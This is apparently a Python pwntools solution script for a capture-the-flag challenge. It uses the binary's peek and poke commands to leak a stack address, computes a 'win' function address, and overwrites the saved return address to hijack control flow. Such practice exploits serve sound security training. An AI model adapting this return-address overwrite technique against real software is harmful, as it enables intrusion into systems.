#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 33623)
    else:
        p = process('./chall')
    return p

def poke(p, x, y):
    p.sendlineafter(b':\n', 'poke {} {}'.format(x, y).encode())

def peek(p, x):
    p.sendlineafter(b':\n', 'peek {}'.format(x).encode())
    return int(p.recvline())

def peekq(p, x):
    b = [(peek(p, x+i)+256)%256 for i in range(8)]
    return unpack(bytes(b))

def pokeq(p, x, y):
    for i, c in enumerate(pack(y)):
        poke(p, x+i, c)

p = conn()
magic = b'tbtltbtl'
p.sendlineafter(b':', magic)
assert peekq(p, 0) == unpack(magic)

leak_offset = 0x238
leak_address = peekq(p, leak_offset)
win_address = leak_address + 0xb80
ret_offset = 0x218
old_ret = peekq(p, ret_offset)
pokeq(p, ret_offset, win_address)
pokeq(p, ret_offset+0x8, old_ret)
p.sendline(b'quit')

p.interactive()
